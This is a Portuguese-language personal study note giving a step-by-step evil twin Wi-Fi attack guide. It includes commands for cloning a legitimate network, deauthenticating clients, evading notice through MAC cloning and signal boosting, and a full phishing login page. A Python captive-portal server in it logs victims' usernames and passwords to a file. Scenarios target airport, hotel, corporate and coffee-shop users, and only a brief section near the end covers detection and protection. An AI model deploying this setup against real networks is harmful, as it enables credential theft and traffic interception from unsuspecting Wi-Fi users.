2025-09-04 07:53

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[Redes]] | [[Ponto de Acesso]]

----
# Introdução

Um ataque de Ponto de Acesso Falso *(Evil Twin)* consiste em criar uma rede Wi-Fi maliciosa que se passa por uma rede legítima para capturar credenciais, redirecionar tráfego ou realizar ataques *man-in-the-middle*.

---
# Fundamentos do Evil Twin

## Conceitos e Objetivos

**Definição:** Um AP falso que replica o SSID e configurações de uma rede legítima.

**Objetivos Principais:**
- Capturar credenciais de autenticação.
- Interceptação de tráfego sensível.
- Distribuição de malware.
- Coleta de informações.

## Componentes do Ataque

```bash
# Interface wireless em modo monitor
sudo airmon-ng start wlan0

# Ferramenta para criar AP falso
sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "Rede-Legitima" -c 6 wlan0mon
```

---
# Ferramentas e Configuração

## Ferramentas Principais

### 1. Airbase-ng (Aircrack-ng Suite)

```bash
# Criar AP falso básico
sudo airbase-ng -a [BSSID_ALVO] --essid "[ESSID_ALVO]" -c [CANAL] wlan0mon

# Com opções avançadas
sudo airbase-ng -a [BSSID] --essid "[ESSID]" -c [CANAL] -W 1 -Z 4 wlan0mon
```

- `-W` : Ativa WPA `1` ou WPA2 `2`
- `-Z`: Tipo de criptografia

### 2. Hostapd (Mais Avançado)

```bash
# Configuração em /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=Rede-Legitima-Falsa
hw_mode=g
channel=6
wpa=2
wpa_passphrase=senha123
wpa_key_mgmt=WPA-PSK
```

## 3. Wifiphisher (Automatizado)

```bash
# Ataque automatizado com phishing
sudo wifiphisher --essid "Rede-Legitima" -c 6 -j
```

- `-j`: Injetar JavaScript nas páginas

---
# Configuração completa do Ambiente

## 1. Preparação das interfaces

```bash
# Parar serviços que interferem
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
sudo airmon-ng check kill

# Configurar interface em modo monitor
sudo airmon-ng start wlan0

# Verificar modo monitor
iwconfig
```

## 2. Configuração de Rede

```bash
# Verificar interface criada
ifconfig

# Configurar interface para AP
sudo ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 wlan0mon
```

## 3. Configuração do DHCP Server

```bash
# Instalar e configurar DHCP server
sudo apt install isc-dhcp-server
```

```bash
# /etc/dhcp/dhcpd.conf
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.100 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 192.168.1.1;
    option subnet-mask 255.255.255.0;
    default-lease-time 600;
    max-lease-time 7200;
}
```

```bash
# Especificar interface para o DHCP
echo 'INTERFACESv4="at0"' | sudo tee /etc/default/isc-dhcp-server

# Iniciar servidor DHCP
sudo systemctl start isc-dhcp-server
```

## 4. Criação de Páginas de Login Falsas

```bash
# Criar diretório para o portal cativo
mkdir ~/captive_portal
cd ~/captive_portal
touch index.html
touch captive_portal.py
```

### 4.1 Estrutura Básica de Phishing

```html
<!-- captive_portal/login.html -->
<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
    <title>Login Required - Secure Network</title>
    <meta charset="utf-8">
    <style>
        body { 
            font-family: 'Arial', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #667eea;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #5a67d8;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>🔒 Secure Network Login</h2>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p style="text-align: center; font-size: 12px; color: #666;">
            By connecting, you agree to our Terms of Service
        </p>
    </div>
</body>
</html>
```

### 4.2 Servidor Web com Python

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime

class CaptivePortalHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            # Redirecionar tudo para a página de login
            self.send_response(302)
            self.send_header('Location', 'http://192.168.1.1/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            form_data = urllib.parse.parse_qs(post_data.decode())
            
            username = form_data.get('username', [''])[0]
            password = form_data.get('password', [''])[0]
            
            # Registrar credenciais
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open('credentials.log', 'a') as f:
                f.write(f"{timestamp} - User: {username}, Pass: {password}\n")
                f.write(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
                f.write("-" * 50 + "\n")
            
            # Redirecionar para página de sucesso (ou site real)
            self.send_response(302)
            self.send_header('Location', 'http://example.com')
            self.end_headers()

def run_server():
    server_address = ('192.168.1.1', 80)
    httpd = HTTPServer(server_address, CaptivePortalHandler)
    print('Servidor captive portal iniciado em http://192.168.1.1:80')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

## 5. Ativação do Servidor Web

**Iniciar o servidor Python:**

```bash
# Terminal 2 - Inciar Servidor web
cd ~/captive_portal
sudo python3 captive_portal.py
```

## 6. Configuração do IP Forwarding e NAT

Para redirecionar tráfego e fornecer internet (opcional):

```bash
# Ativar IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Configurar NAT se tiver internet para compartilhar
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

## 7. Saídas e Resultados Esperados

**Arquivos Gerados durante o Teste:**

```text
~/captive_portal/
├── credentials.log          # Credenciais capturadas
├── captive_portal.py        # Servidor web
└── index.html              # Página de login

/var/lib/dhcp/
└── dhcpd.leases           # concessões DHCP atribuídas
```

**Arquivo `credentials.log` exemplo:**

```text
2024-01-01 14:30:22 - User: joao.silva, Pass: senha123
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
--------------------------------------------------
2024-01-01 14:32:45 - User: maria.souza, Pass: 123mudar
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
--------------------------------------------------
```

**Logs do Sistema Relevantas:**

```bash
# Ver logs do DHCP
sudo journalctl -u isc-dhcp-server -n 20

# Ver logs de rede
sudo journalctl -u NetworkManager -n 20
```

## 8. Finalizando os Processos

**Servidor Python:**

```bash
# Encontrar e parar o processo do servidor Python
sudo pkill -f "python3 captive_portal.py"

# Ou parar pelo PID se conhecido
sudo kill [PID_DO_SERVIDOR]
```

**Servidor DHCP:**

```bash
# Parar serviço DHCP
sudo systemctl stop isc-dhcp-server

# Verificar status
sudo systemctl status isc-dhcp-server
```

```bash
# Restaurar configuração original do DHCP
sudo cp /etc/dhcp/dhcpd.conf.backup /etc/dhcp/dhcpd.conf

# Ou remover configurações temporárias
sudo sed -i '/subnet 192.168.1.0/,/}/d' /etc/dhcp/dhcpd.conf
```

**Limpeza de Regras IPTables:**

```bash
# Ver todas as regras NAT
sudo iptables -t nat -L -v -n

# Ver regras de filter
sudo iptables -L -v -n
```

```bash
# Remover regra de redirecionamento HTTP
sudo iptables -t nat -D PREROUTING -s 192.168.1.0/24 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Remover regras de NAT se foram adicionadas
sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -D FORWARD -i at0 -o eth0 -j ACCEPT
sudo iptables -D FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

**Resetar IPTables (cuidado):**

```bash
# Resetar todas as regras (apenas se necessário)
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -X
sudo iptables -t nat -X

# Restaurar políticas padrão
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

**Reiniciar Gerenciadores de Rede:**

```bash
# Reiniciar NetworkManager
sudo systemctl start NetworkManager
sudo systemctl restart NetworkManager

# Reiniciar wpa_supplicant se necessário
sudo systemctl start wpa_supplicant
```

**Remover Arquivos Temporários:**

```bash
# Remover arquivos de log e captura
sudo rm -f ~/captive_portal/credentials.log
sudo rm -f /var/lib/dhcp/dhcpd.leases~

# Limpar arquivos temporários do airbase-ng
sudo rm -f /tmp/airbase-ng-*
```

---
# Script de Limpeza Automática

## Script de Restauração

```bash
#!/bin/bash
# cleanup_after_test.sh

echo "🔄 Iniciando limpeza pós-teste..."

# Parar processos
sudo pkill -f airbase-ng
sudo pkill -f "python3 captive_portal.py"
sudo systemctl stop isc-dhcp-server

# Limpar interfaces
sudo iw dev at0 del 2>/dev/null
sudo airmon-ng stop wlan0mon 2>/dev/null

# Limpar iptables
sudo iptables -t nat -F
sudo iptables -F

# Reiniciar serviços
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant

# Limpar arquivos temporários
rm -f ~/captive_portal/credentials.log
sudo rm -f /var/lib/dhcp/dhcpd.leases~

echo "✅ Limpeza concluída!"
echo "📋 Verificando estado do sistema:"
iwconfig wlan0
systemctl status NetworkManager | grep "Active:"
```

## Tornar Executável e Usar

```bash
chmod +x cleanup_after_test.sh

# Executar limpeza
./cleanup_after_test.sh
```


---
# Cenários de Ataque Práticos

## Cenário 1: Rede Pública Falsa

**Objetivo:** Capturar credenciais em aeorportos/hotéis

```bash
# Configurar AP com nome genérico
sudo airbase-ng --essid "Airport-Free-WiFi" -c 1 wlan0mon

# Redirecionar todo o tráfego para portal
sudo iptables -t nat -A PREROUTING -s 192.168.1.0/24 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

1. `sudo iptables`
	- **Função:** Ferramenta de administração de firewall do Linux
	- **Propósito:** Manipular tabelas de netfilter (sistema de filtragem de pacotes)

2. `-t nat`
	- **Tabela:** `nat` *(Network Address Translation)*
	- **Função:** Tabela para tradução de endereços de rede
	- **Uso:** Redirecionamento, masquerading, etc.

3. `-A PREROUTING`
	- **Cadeia:** `PREROUTING`
	- **Momento:** Antes do roteamento (pacotes que chegam)
	- **Função:** Modificar pacotes antes de decidir para onde enviar

4. `-s 192.168.1.0/24`
	- **Fonte:** Pacotes da rede 192.168.1.0/24
	- **Significado:** Todos os IPs de 192.168.1.1 a 192.168.1.254
	- **Aplicação:** Apenas clientes conectados ao AP falso

5. `-p tcp`
	- **Protocolo:** TCP *(Transmission Control Protocol)*
	- **Razão:** HTTP/HTTPS usam TCP, não UDP

6. `--dport 80`
	- **Porta de Destino**: Porta 80
	- **Serviço**: HTTP (HyperText Transfer Protocol)
	- **Alvo**: Tráfego web não criptografado

7. `-j REDIRECT`
	- **Ação**: REDIRECT 
	- **Efeito**: Redireciona pacotes para outra porta local
	- **Uso**: Comumente usado para captive portals

8. `--to-port 8080`
	- **Porta de Redirecionamento**: 8080
	- **Destino**: Servidor web local na porta 8080    
	- **Flexibilidade**: Permite usar porta não padrão

**Fluxo de Pacote:**

```text
Cliente (192.168.1.101) → Requisição HTTP para google.com:80
       ↓
Interface at0 (AP falso) → Pacote chega no Linux
       ↓
Tabela nat PREROUTING → Regra corresponde (origem 192.168.1.0/24, porta 80)
       ↓
Ação REDIRECT → Modifica destino para 192.168.1.1:8080
       ↓
Servidor local (192.168.1.1:8080) → Recebe requisição na porta 8080
       ↓
Resposta com página de login → Cliente vê portal cativo
```

## Cenário 2: Clone de Rede Corporativa

**Objetivo:** Enganar funcionários

```bash
# Clonar SSID e BSSID da rede real
sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "Empresa-Corp" -c wlan0mon

# Forçar deautenticação da rede legítima
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Cenário 3: Rede com Portal Captivo Personalizado

**Objetivo:** Phishing específico

```bash
# Usando wifiphishier para ataque automatizado
sudo wifiphisher --essid "Star-Bucks-Free-WiFi" -p templates/starbucks-login/
```

---
# Técnicas de Dissimulação

## 1. Clone de MAC Address

```bash
# Clonar MAC address do AP legítimo
sudo ifconfig wlan0mon down
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0mon
sudo ifconfig wlan0mon up
```

## 2. Ajusto de Potência do Sinal

```bash
# Aumentar potência para sobrepor sinal legítimo
sudo iwconfig wlan0mon txpower 30
```

## 3. Beacon Flooding

```bash
# Criar múltiplos APs falsos para confundir
mdk4 wlan0mon b -n "Rede-Legitima" -c 6
```

---
# Detecção e Prevenção

## Sinais de AP Falso

- Sinal mais forte que o normal
- Dois APs com mesmo SSID
- Autenticação inconsistente
- Redirecionamentos HTTP suspeitos

## Ferramentas de Detecção

```bash
# Verificar BSSIDs duplicados
sudo airodump-ng wlan0mon | grep "Rede-Legitima"

# Usar Kismet para detecção avançada
sudo kismet -c wlan0mon
```

## Mediadas de Proteção

- Verificar certificados SSL
- Usar VPN em redes públicas
- Desativar conexão automática a redes Wi-Fi
- Verificar endereços MAC de APs confiáveis

---
# Fluxo completo de Ataque

```text
Preparação do Ambiente → Configuração do AP Falso → Clone de Rede Legítima
        ↓                       ↓                       ↓
  Modo Monitor           Serviços de Rede          Deautenticação
        ↓                       ↓                       ↓
Captive Portal → Redirecionamento de Tráfego → Coleta de Credenciais
        ↓                       ↓                       ↓
  Análise de Dados → Limpeza de Evidências → Relatório de Vulnerabilidades
```

---
# Resposta a Incidentes

## 1. Identificação

```bash
# Logs de autenticação suspeitos
grep "Association" /var/log/syslog

# Verificar conexões simultâneas
iw dev wlan0 station dump
```
## 2. Mitigação

```bash
# Bloquear MAC address suspeito
sudo iptables -A INPUT -m mac --mac-source AA:BB:CC:DD:EE:FF -j DROP

# Alterar canal de rede legítima
sudo wiconfig wlan0 channel 11
```

---
# Recursos e Referências

## 1. Ferramentas Adicionais

- **BetterCAP**: Framework completo para ataques
- **Fluxion**: Script automatizado para evil twin
- **Linset**: Outra alternativa automatizada

## 2. Treinamento Recomendado

- Certificação CEH (Ethical Hacker)
- Curso de penetration testing wireless
- Laboratórios práticos de redes

## 3. Documentação Oficial

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Hostapd Documentation](https://w1.fi/hostapd/)
- [Wifiphisher GitHub](https://github.com/wifiphisher/wifiphisher)